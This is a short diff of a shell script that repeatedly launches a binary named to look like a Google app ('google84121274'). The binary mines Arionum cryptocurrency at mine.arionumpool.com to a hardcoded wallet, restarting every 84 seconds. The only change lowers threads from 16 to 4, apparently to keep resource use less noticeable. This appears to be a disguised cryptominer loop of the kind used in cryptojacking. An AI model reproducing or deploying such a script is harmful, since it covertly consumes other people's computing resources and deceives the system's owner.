@@ -11,7 +11,7 @@ cd googleapps8474
 while true
 do
 
-timeout 84 ./google84121274 -p http://mine.arionumpool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
+timeout 84 ./google84121274 -p http://mine.arionumpool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 4 -b 4
 if [ $? -eq 124 ]; then
 echo "google84"
 else
